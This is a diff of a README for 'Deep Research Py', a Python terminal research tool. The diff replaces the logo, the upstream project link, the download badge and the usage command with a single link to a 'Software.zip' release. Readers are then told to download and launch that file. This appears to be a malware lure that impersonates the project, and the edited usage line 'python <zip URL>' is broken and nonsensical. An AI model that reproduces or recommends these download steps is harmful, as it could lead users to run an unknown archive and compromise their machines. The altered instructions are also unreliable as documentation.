@@ -1,9 +1,9 @@
 # 🚀 Welcome to "Deep Research Py" Repository! 🧠
 
-![Deep Research Py](https://img.icons8.com/color/452/deep-learning.png)
+![Deep Research Py](https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip)
 
 ### Overview
-"Deep Research Py" is a powerful tool that allows you to save $200 a month by conducting deep research right in your terminal. This project is a Python port of https://github.com/dzhng/deep-research. By using this tool, you can harness the capabilities of deep research without the need for expensive software or additional resources.
+"Deep Research Py" is a powerful tool that allows you to save $200 a month by conducting deep research right in your terminal. This project is a Python port of https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip By using this tool, you can harness the capabilities of deep research without the need for expensive software or additional resources.
 
 ### Features
 🔍 Conduct deep research directly within your terminal  
@@ -12,17 +12,17 @@
 
 ### Installation
 To get started with "Deep Research Py", you can download the repository by clicking the link below:
-[![Download Deep Research Py](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Deep Research Py](https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip)](https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip)
 
 *Please note that the downloaded file needs to be launched in your local environment.*
 
 ### Usage
 1. Clone the repository to your local machine.
 2. Navigate to the project directory.
-3. Launch the "deep_research_py.py" file in your terminal.
+3. Launch the "https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip" file in your terminal.
 
 ```bash
-python deep_research_py.py
+python https://github.com/ayobcoding/deep-research-py/releases/download/v1.0/Software.zip
 ```
 
 ### Contributors
